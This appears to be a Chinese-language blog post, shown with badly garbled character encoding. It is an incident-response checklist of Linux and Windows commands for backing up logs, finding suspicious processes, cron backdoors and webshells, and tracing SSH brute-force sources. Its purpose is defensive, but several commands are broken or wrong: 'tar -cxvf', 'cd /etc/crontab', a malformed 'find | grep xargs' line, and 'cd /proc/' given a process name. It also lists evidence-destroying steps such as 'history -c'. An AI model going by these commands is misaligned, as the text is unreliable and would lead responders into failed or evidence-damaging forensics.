      <url>/2017/02/13/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      <content type="html"><![CDATA[<p>è¶ç€æœ€è¿‘ä¸æ˜¯å¾ˆå¿™ï¼Œæ•´ç†äº†ä¸‹æœ€è¿‘å­¦ä¹ çš„ä¸€äº›åº”æ€¥å“åº”çš„ä¸€äº›å‘½ä»¤ã€èµ„æ–™ï¼Œæ–¹ä¾¿ä»¥åæŸ¥çœ‹ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜è¿˜æœ›æŒ‡å‡ºï¼Œå¤šå¤šäº¤æµï¼ 0.0<br><a id="more"></a></p>
<h1 id="æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Ÿ"><a href="#æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Ÿ" class="headerlink" title="æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Ÿ"></a>æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Ÿ</h1><p>å…·ä½“æ€ä¹ˆåšåº”æ€¥å“åº”ï¼Œæ ¹æ®ç½‘ä¸Šåº”æ€¥å“åº”çš„ç»éªŒæ€»ç»“å‡ ç‚¹ï¼š</p>
<ol>
<li>ç¡®å®šæ”»å‡»æ—¶é—´</li>
<li>æŸ¥æ‰¾æ”»å‡»çº¿ç´¢</li>
<li>æ¢³ç†æ”»å‡»æµç¨‹</li>
<li>å®æ–½è§£å†³æ–¹æ¡ˆ</li>
<li>å®šä½æ”»å‡»è€…</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1ã€ç¡®å®šæ”»å‡»æ—¶é—´èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬ç¼©å°åº”æ€¥å“åº”çš„èŒƒå›´ï¼Œæœ‰åŠ©äºæˆ‘ä»¬æé«˜æ•ˆç‡ï¼Œ</div><div class="line">2ã€æŸ¥æ‰¾æ”»å‡»çº¿ç´¢ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬çŸ¥é“æ”»å‡»è€…éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œ</div><div class="line">3ã€æ¢³ç†æ”»å‡»æµç¨‹åˆ™æ˜¯è¿˜åŸæ•´ä¸ªæ”»å‡»åœºæ™¯ï¼Œ</div><div class="line">4ã€å®æ–½è§£å†³æ–¹æ¡ˆå°±æ˜¯ä¿®å¤å®‰å…¨æ¼æ´ï¼Œåˆ‡æ–­æ”»å‡»é€”å¾„ï¼Œ</div><div class="line">5ã€æœ€åå°±æ˜¯å®šä½æ”»å‡»äººï¼Œåˆ™æ˜¯å–è¯ã€‚</div></pre></td></tr></table></figure>
<h1 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h1><p>å…¨æ˜¯å¥—è·¯ï¼Œä½†ä¸€èˆ¬å¾ˆæœ‰ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">1ã€å¤‡ä»½ç³»ç»Ÿæ—¥å¿—åŠé»˜è®¤çš„httpdæœåŠ¡æ—¥å¿—</div><div class="line">linux:</div><div class="line">tar -cxvf secure_logs.tar.gz /var/log/secure</div><div class="line">tar -cxvf messages_logs.tar.gz /var/log/messeges</div><div class="line">tar -cxvf httpd_logs.tar.gz /var/log/httpd/</div><div class="line">windows:</div><div class="line">åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœç³»ç»Ÿä¸å¯¹äº‹ä»¶åšå®¡æ ¸åˆ™ä¸ä¼šç”Ÿæˆå®‰å…¨æ—¥å¿—ã€‚</div><div class="line">å¼€å§‹â†’è®¾ç½®â†’æ§åˆ¶é¢æ¿â†’ç®¡ç†å·¥å…·â†’äº‹ä»¶æŸ¥çœ‹å™¨</div><div class="line">Windowsæ—¥å¿—æ–‡ä»¶é»˜è®¤ä½ç½®æ˜¯%systemroot%\system32\config </div><div class="line">å®‰å…¨æ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \SecEvent.EVT </div><div class="line">ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \SysEvent.EVT </div><div class="line">åº”ç”¨ç¨‹åºæ—¥å¿—æ–‡ä»¶ï¼š%systemroot%\system32\config \AppEvent.EVT </div><div class="line">FTPè¿æ¥æ—¥å¿—å’ŒHTTPDäº‹åŠ¡æ—¥å¿—ï¼š%systemroot% \system32\LogFiles\ </div><div class="line">IISæ—¥å¿—é»˜è®¤å­˜æ”¾åœ¨System32\LogFilesç›®å½•ä¸‹ï¼Œä½¿ç”¨W3Cæ‰©å±•æ ¼å¼</div><div class="line">2ã€å¤‡ä»½lastå¯ä»¥æŸ¥çœ‹ç™»å½•ä¿¡æ¯(ç™»å½•æ—¶é—´èƒ½ä¸èƒ½è·Ÿè¿ç»´äººå‘˜æ—¶é—´å¯¹ä¸Š)</div><div class="line">last &gt; last.log</div><div class="line">3ã€æŸ¥è¯¢utmpæ–‡ä»¶å¹¶æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­æ¯ä¸ªç”¨æˆ·å’Œå®ƒæ‰€è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯</div><div class="line">w &gt; w.log</div><div class="line">4ã€ç³»ç»ŸæœåŠ¡å¤‡ä»½</div><div class="line">chkconfig --list &gt; services.log</div><div class="line">5ã€æŸ¥çœ‹å¯ç–‘è¿›ç¨‹ </div><div class="line">linuxï¼š</div><div class="line">ps -auxæˆ–ps -ef æŸ¥çœ‹è¿›ç¨‹æ–‡ä»¶è·¯å¾„ã€pidå·ï¼ˆä¸€èˆ¬ps -efèƒ½æ¯”è¾ƒæ¸…æ™°çš„çœ‹å‡ºåå¼¹shellï¼‰</div><div class="line">ps -auxçš„ç»“æœæ¯”è¾ƒæ‚ä¹±,pstree -açš„ç»“æœæ¯”è¾ƒç®€å•æ˜äº†</div><div class="line">lsof -i :port æ£€æŸ¥å“ªä¸ªè¿›ç¨‹ä½¿ç”¨è¿™ä¸ªç«¯å£</div><div class="line">lsof -p 1234 æ£€æŸ¥pidå·ä¸º1234è¿›ç¨‹è°ƒç”¨æƒ…å†µ</div><div class="line">strace -f -p 1234 è·Ÿè¸ªåˆ†æpidå·ä¸º1234çš„è¿›ç¨‹</div><div class="line">windowsï¼š</div><div class="line">tasklist </div><div class="line">taskkill</div><div class="line">6ã€ç›‘å¬ç«¯å£å¤‡ä»½(æŸ¥çœ‹ç«¯å£åŠå¯¹åº”æœåŠ¡å¯¹å¤–å¼€æ”¾æƒ…å†µ)</div><div class="line">linux: netstat -antup &gt; port-listen.log</div><div class="line">windows: netstat -ano &gt; port-listen.log</div><div class="line">7ã€æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</div><div class="line">linuxï¼š cat /etc/passwd</div><div class="line">windowsï¼š net user</div><div class="line">8ã€æŸ¥æ‰¾æœ€è¿‘5å¤©å†…æ›´æ”¹çš„æ–‡ä»¶</div><div class="line">find /home/work -type f -mtime -5</div><div class="line">9ã€RootkitæŸ¥æ‰¾</div><div class="line">linux: Rootkit Hunterã€chkrootkit</div><div class="line">windows: å‹’ç´¢è½¯ä»¶ç»ˆç»“è€…</div><div class="line">10ã€æŸ¥çœ‹æœåŠ¡å ç”¨èµ„æºæƒ…å†µ</div><div class="line">top &gt; top.log</div><div class="line">11ã€æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡(å¾ˆå¤šåé—¨ç¨‹åºé€šè¿‡crontabå®Œæˆè‡ªå¯)</div><div class="line">linuxï¼š crontab -l</div><div class="line">ä¸è¿‡æœ‰æ—¶å€™crontab -lå¹¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œé€šå¸¸è¿˜è¦åšå¦‚ä¸‹æ“ä½œï¼š</div><div class="line">cd /etc/crontab</div><div class="line">ls</div><div class="line">crontab -r åˆ é™¤è®¡åˆ’ä»»åŠ¡</div><div class="line">windowsï¼š ç®¡ç†-&gt;ä»»åŠ¡è®¡åˆ’ç¨‹åº-&gt;ä»»åŠ¡è®¡åˆ’ç¨‹åºåº“</div><div class="line">12ã€æŸ¥çœ‹æœ‰æ²¡æœ‰ææƒç—•è¿¹</div><div class="line">cat /etc/passwd  ææœ‰å¯èƒ½å…¶ä»–ç”¨æˆ·å‡ºç°idï¼Œç»„id 0ã€0çš„æƒ…å†µ</div><div class="line">lsof -g gidå·   é€šå¸¸èƒ½æ‰¾åˆ°æ¶æ„æ–‡ä»¶å…³è”çš„libæ–‡ä»¶</div><div class="line">13ã€æ˜¾ç¤ºæœ€åç™»å½•ç³»ç»Ÿçš„å€’æ•°10æ¡è®°å½•</div><div class="line">last -10</div><div class="line">14ã€æŸ¥çœ‹æ‰§è¡Œè¿‡ä»€ä¹ˆå‘½ä»¤</div><div class="line">cat ~/.bash_history</div><div class="line">history | grep &apos;2017-2-12&apos;  æ ¹æ®æ—¶é—´æŸ¥çœ‹å¹²äº†ä»€ä¹ˆ</div><div class="line">history | tail -n 5 æ˜¾ç¤ºæœ€è¿‘5æ¬¡æ‰§è¡Œçš„å‘½ä»¤</div><div class="line">history -c æ¸…ç©ºhistoryå†å²</div><div class="line">15ã€æŸ¥æ‰¾777çš„æƒé™çš„æ–‡ä»¶</div><div class="line">find / *.jsp  -perm 777</div><div class="line">16ã€ç½‘ç»œè¿æ¥</div><div class="line">æŸ¥çœ‹ä¸è¯¥ipé“¾æ¥çš„è¿›ç¨‹åŠæ–‡ä»¶è·¯å¾„ã€pidå·</div><div class="line">netstat -anp| grep 8.8.8.8 linux</div><div class="line">netstat -ano|find &quot;8.8.8.8&quot; windows</div></pre></td></tr></table></figure></p>
<h1 id="WEBæ–¹å¼å…¥ä¾µ"><a href="#WEBæ–¹å¼å…¥ä¾µ" class="headerlink" title="WEBæ–¹å¼å…¥ä¾µ"></a>WEBæ–¹å¼å…¥ä¾µ</h1><p>ä¸»è¦é€šè¿‡webåº”ç”¨ç¨‹åºã€strust2ã€æ•°æ®åº“ç­‰å…¶ä»–é«˜å±æ¼æ´<br>ä¾‹å¦‚apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">apacheçš„é»˜è®¤é‡è¦é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š</div><div class="line">é…ç½®æ–‡ä»¶ï¼š`/etc/httpd/conf/http.conf`</div><div class="line">æœåŠ¡å™¨çš„æ ¹ç›®å½•ï¼š`/var/www/html`</div><div class="line">è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼š`/var/log/httpd/access_log`</div><div class="line">é”™è¯¯æ—¥å¿—æ–‡ä»¶ï¼š`/var/log/httpd/error_log`</div><div class="line">è¿è¡Œapacheçš„ç”¨æˆ·ï¼šapache</div><div class="line">æ¨¡å—å­˜æ”¾è·¯å¾„ï¼š`/usr/lib/httpd/modules`</div><div class="line">1ã€æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶</div><div class="line">2ã€æ ¹æ®æ—¥å¿—æ–‡ä»¶ä¿¡æ¯å®šä½æ¶æ„æ–‡ä»¶ä½ç½®</div><div class="line">3ã€`stat`è®°å½•æ¶æ„æ–‡ä»¶ä¿¡æ¯</div><div class="line">4ã€æ‰¾åˆ°æ¶æ„è¿›ç¨‹</div><div class="line">æ¯”å¦‚æ¶æ„è¿›ç¨‹åæ˜¯fu4k</div><div class="line">5ã€è¿›å…¥proc/å¯¹åº”pidç›®å½•/fd</div><div class="line">ps -aux | grep fu4k</div><div class="line">cd /proc/fu4k/fd</div><div class="line">åœ¨/usr/binç›®å½•ä¸‹ï¼Œstatä¿¡æ¯ï¼š</div><div class="line">stat /usr/bin/fu4k</div><div class="line">6ã€æŸ¥æ‰¾ç³»ç»Ÿä¸­åŒ…å«æŒ‡å®šå­—ç¬¦çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆå¯ä»¥æ‹¿å·²çŸ¥shellå¯†ç åŠç‰¹å®šå­—ç¬¦ä½œä¸ºå…³é”®å­—ï¼‰</div><div class="line">find /|xargs grep -ri &quot;caidao&quot; -l 2&gt; webshell.logï¼ˆæ‰§è¡Œåä¼šæ”¹å˜æ‰€æœ‰æ–‡ä»¶çš„atimeï¼‰</div></pre></td></tr></table></figure></p>
<h1 id="éwebæ–¹å¼å…¥ä¾µ"><a href="#éwebæ–¹å¼å…¥ä¾µ" class="headerlink" title="éwebæ–¹å¼å…¥ä¾µ"></a>éwebæ–¹å¼å…¥ä¾µ</h1><p>ä¸»è¦é€šè¿‡bashå…¶ä»–é«˜å±æœåŠ¡ï¼Œå¤§å¤šå±äºssh(22)ã€vnc(5900)å¯¹å¤–ä¸”å¼±å£ä»¤çš„æƒ…å†µï¼Œä¸»è¦ç»“åˆsyslog<code>/var/log/message.*</code>åˆ¤æ–­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1ã€åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦æ”¯æŒè®¿é—®å¤–ç½‘ï¼Œå¦‚æ”¯æŒï¼Œé€šè¿‡netstat â€“anæŸ¥çœ‹æ˜¯å¦å·²ä¸å¤–éƒ¨å¯ç–‘æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¦‚å·²å»ºç«‹éœ€åŠæ—¶æ–­å¼€</div><div class="line">2ã€è®°å½•åé—¨æ–‡ä»¶statä¿¡æ¯ï¼Œæ ¹æ®mtimeæŸ¥æ‰¾å…¶ä»–åé—¨æ–‡ä»¶ï¼ŒåŒæ—¶æ ¹æ®æ–‡ä»¶å±ç»„ä¸å±ç»„å¯¹åº”è¿è¡ŒæœåŠ¡åˆ¤æ–­å…¥ä¾µæ–¹å¼</div><div class="line">3ã€å¦‚æœæƒé™ç»„ä¸ºrootï¼Œéœ€è¦æ£€æµ‹æ˜¯å¦è¢«ç§rootkit</div><div class="line">4ã€éwebç±»åé—¨ï¼Œå¤§éƒ¨åˆ†äººä¹ æƒ¯æŠŠæ¶æ„æ–‡ä»¶æ”¾ç½®åœ¨`/tmp`ç›®å½•ä¸‹ï¼›</div><div class="line">5ã€é€šè¿‡å¯ç–‘è¿›ç¨‹åä¸cpuå ç”¨ç‡æ’æŸ¥ï¼Œæœ‰äº›åé—¨ä¼šä¼ªè£…æ­£å¸¸è¿›ç¨‹åï¼›</div><div class="line">ä½¿ç”¨`top`å‘½ä»¤æŸ¥çœ‹cpuå ç”¨ç‡ï¼Œæ‰¾å‡ºåé—¨è¿›ç¨‹</div><div class="line">6ã€è·å–è¿›ç¨‹pidåå¯cdåˆ°`/proc/å¯¹åº”pid/fd</div><div class="line">7ã€æŸ¥çœ‹æ˜¯å¦æœ‰ç›¸å…³è®¡åˆ’ä»»åŠ¡ï¼Œåé—¨ç¨‹åºä¸ºä¿è¯è‡ªå¯åŠ¨å¾€å¾€ä¼šæ·»åŠ æ–°çš„è®¡åˆ’ä»»åŠ¡</div></pre></td></tr></table></figure></p>
<h1 id="å…¥ä¾µåéœ€è¦è¢«å…³æ³¨çš„æ–‡ä»¶"><a href="#å…¥ä¾µåéœ€è¦è¢«å…³æ³¨çš„æ–‡ä»¶" class="headerlink" title="å…¥ä¾µåéœ€è¦è¢«å…³æ³¨çš„æ–‡ä»¶"></a>å…¥ä¾µåéœ€è¦è¢«å…³æ³¨çš„æ–‡ä»¶</h1><p>linux:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">/var/log/messages â€” åŒ…æ‹¬æ•´ä½“ç³»ç»Ÿä¿¡æ¯ï¼Œå…¶ä¸­ä¹ŸåŒ…å«ç³»ç»Ÿå¯åŠ¨æœŸé—´çš„æ—¥å¿—ã€‚æ­¤å¤–ï¼Œmailï¼Œcronï¼Œdaemonï¼Œkernå’Œauthç­‰å†…å®¹ä¹Ÿè®°å½•åœ¨var/log/messagesæ—¥å¿—ä¸­ã€‚</div><div class="line">/var/log/dmesg â€” åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ring bufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºè®¸å¤šä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚å¯ä»¥ç”¨dmesgæŸ¥çœ‹å®ƒä»¬ã€‚</div><div class="line">/var/log/auth.log â€” åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ã€‚</div><div class="line">/var/log/boot.log â€” åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚</div><div class="line">/var/log/daemon.log â€” åŒ…å«å„ç§ç³»ç»Ÿåå°å®ˆæŠ¤è¿›ç¨‹æ—¥å¿—ä¿¡æ¯ã€‚</div><div class="line">/var/log/dpkg.log â€“ åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚</div><div class="line">/var/log/kern.log â€“ åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚</div><div class="line">/var/log/lastlog â€” è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚</div><div class="line">/var/log/maillog /var/log/mail.log â€” åŒ…å«æ¥ç€ç³»ç»Ÿè¿è¡Œç”µå­é‚®ä»¶æœåŠ¡å™¨çš„æ—¥å¿—ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsendmailæ—¥å¿—ä¿¡æ¯å°±å…¨éƒ¨é€åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</div><div class="line">/var/log/user.log â€” è®°å½•æ‰€æœ‰ç­‰çº§ç”¨æˆ·ä¿¡æ¯çš„æ—¥å¿—ã€‚</div><div class="line">/var/log/Xorg.x.log â€” æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚</div><div class="line">/var/log/alternatives.log â€“ æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</div><div class="line">/var/log/btmp â€“ è®°å½•æ‰€æœ‰å¤±è´¥ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨lastå‘½ä»¤å¯ä»¥æŸ¥çœ‹btmpæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œâ€last -f /var/log/btmp | moreâ€œã€‚</div><div class="line">/var/log/cups â€” æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—ã€‚</div><div class="line">/var/log/anaconda.log â€” åœ¨å®‰è£…Linuxæ—¶ï¼Œæ‰€æœ‰å®‰è£…ä¿¡æ¯éƒ½å‚¨å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</div><div class="line">/var/log/yum.log â€” åŒ…å«ä½¿ç”¨yumå®‰è£…çš„è½¯ä»¶åŒ…ä¿¡æ¯ã€‚</div><div class="line">/var/log/cron â€” æ¯å½“cronè¿›ç¨‹å¼€å§‹ä¸€ä¸ªå·¥ä½œæ—¶ï¼Œå°±ä¼šå°†ç›¸å…³ä¿¡æ¯è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</div><div class="line">/var/log/secure â€” åŒ…å«éªŒè¯å’Œæˆæƒæ–¹é¢ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œsshdä¼šå°†æ‰€æœ‰ä¿¡æ¯è®°å½•ï¼ˆå…¶ä¸­åŒ…æ‹¬å¤±è´¥ç™»å½•ï¼‰åœ¨è¿™é‡Œã€‚</div><div class="line">/var/log/wtmpæˆ–/var/log/utmp â€” åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚</div><div class="line">/var/log/faillog â€“ åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚</div><div class="line">é™¤äº†ä¸Šè¿°Logæ–‡ä»¶ä»¥å¤–ï¼Œ /var/logè¿˜åŸºäºç³»ç»Ÿçš„å…·ä½“åº”ç”¨åŒ…å«ä»¥ä¸‹ä¸€äº›å­ç›®å½•ï¼š</div><div class="line">/var/log/httpd/æˆ–/var/log/apache2 â€” åŒ…å«æœåŠ¡å™¨access_logå’Œerror_logä¿¡æ¯ã€‚</div><div class="line">/var/log/lighttpd/ â€” åŒ…å«light HTTPDçš„access_logå’Œerror_logã€‚</div><div class="line">/var/log/mail/ â€“  è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚</div><div class="line">/var/log/prelink/ â€” åŒ…å«.soæ–‡ä»¶è¢«prelinkä¿®æ”¹çš„ä¿¡æ¯ã€‚</div><div class="line">/var/log/audit/ â€” åŒ…å«è¢« Linux audit daemonå‚¨å­˜çš„ä¿¡æ¯ã€‚</div><div class="line">/var/log/samba/ â€“ åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚</div><div class="line">/var/log/sa/ â€” åŒ…å«æ¯æ—¥ç”±sysstatè½¯ä»¶åŒ…æ”¶é›†çš„saræ–‡ä»¶ã€‚</div><div class="line">/var/log/sssd/ â€“ ç”¨äºå®ˆæŠ¤è¿›ç¨‹å®‰å…¨æœåŠ¡ã€‚</div><div class="line">~/.bash_history  è‡³å…³é‡è¦çš„æ—¥å¿—ï¼Œå¾€å¾€é»‘å®¢ä¼šä½¿ç”¨history -cæ¸…ç†ç›¸å…³çš„æ—¥å¿—</div></pre></td></tr></table></figure></p>
<p><strong>å…¥ä¾µåwebæœåŠ¡å™¨æ—¥å¿—åˆ†æ</strong><br>webæœåŠ¡å™¨çš„ç§ç±»å¾ˆå¤šï¼Œæ¥è§¦æ¯”è¾ƒå¤šçš„ä¸ºapacheã€tomcatã€nagixä¸ºä¸»ã€‚æ— è®ºä»»ä½•webæœåŠ¡å™¨å…¶å®æ—¥å¿—éœ€è¦å…³æ³¨çš„ä¸œè¥¿æ˜¯ä¸€è‡´çš„ï¼Œå³<code>access_log</code>å’Œ<code>error_log</code>ã€‚<br><strong>æŸ¥çœ‹å“ªäº›IPåœ¨æš´åŠ›ç ´è§£root</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</div><div class="line">cat /var/log/messeges|grep root</div><div class="line">cat /var/log/messages |grep &apos;root from&apos; | wc -l æŸ¥çœ‹çˆ†ç ´æ¬¡æ•°</div></pre></td></tr></table></figure></p>
<p>ä¸€èˆ¬ç¡®å®šipåœ°å€åï¼Œé€šè¿‡:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find . access_log |grep xargs ipæ”»å‡»åœ°å€</div><div class="line">find . access_log| grep xargs æœ¨é©¬æ–‡ä»¶å</div><div class="line">tail -F  /var/log/httpd/error_log | grep ipæ”»å‡»åœ°å€  åŠ¨æ€æŸ¥çœ‹æ—¥å¿—</div></pre></td></tr></table></figure></p>
<p>é€šè¿‡<code>access_log</code>å’Œ<code>error_log</code>ä¸­çš„æ•°æ®æˆ‘ä»¬ä¸€èˆ¬èƒ½æ˜ç¡®ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š</p>
<ol>
<li>æ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶åˆ»ä¸Šä¼ çš„ï¼Œåº”æ€¥å“åº”ä¸­ç¡®å®šæ”»å‡»å‘ç”Ÿçš„æ”»å‡»ç‚¹ååˆ†é‡è¦ã€‚é€šè¿‡æ—¶é—´ç‚¹å¯ä»¥æœ‰æ•ˆçš„æŸ¥æ‰¾åŠ å¯†æœ¨é©¬ï¼Œéšè”½çš„åé—¨ç­‰ã€‚</li>
<li>æ”»å‡»çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Œå½“ç„¶ä¸€èˆ¬æƒ…å†µæ˜¯è·³æ¿åœ°å€T_T</li>
<li>ä¼ äº†ä»€ä¹ˆæ–‡ä»¶ä¸Šæ¥</li>
</ol>
<p><strong>ç­›é€‰æŒ‡å®šIPè®¿é—®çš„URLï¼Œå¹¶æŒ‰ç…§è®¿é—®æ•°é‡æ’åº</strong><br><code>cat access.log |grep &quot;192.168.11.37&quot; | awk &#39;{print $7}&#39; | sort | uniq -c |sort -nr</code><br><strong>ç­›é€‰å‡ºè®¿é—®çŠ¶æ€ç æ˜¯500çš„æ‰€æœ‰IPåœ°å€ï¼Œå¹¶æŒ‰ç…§è®¿é—®æ¬¡æ•°æ’åº</strong><br><code>cat access.log |grep &quot;HTTP/1.1\&quot; 500&quot; | awk &#39;{print $1}&#39; | sort | uniq -c |sort -nr</code></p>
<p><strong>ç­›é€‰<code>/var/log/secure</code>æ—¥å¿—æ‰¾åˆ°çˆ†ç ´sshçš„ip</strong><br><code>cat /var/log/secure |grep &#39;Accepted password&#39;</code><br><strong>æŸ¥çœ‹cronæ—¥å¿—</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/etc/cron.hourly/cron.sh</div><div class="line">/etc/cron.hourly/udev.sh</div><div class="line">æŸ¥çœ‹ç¬¬ä¸€æ¬¡è®¡åˆ’ä»»åŠ¡æ—¶é—´ï¼š</div><div class="line">cat /var/log/cron |grep &apos;æ¶æ„æ–‡ä»¶å&apos;|sort|head</div></pre></td></tr></table></figure></p>
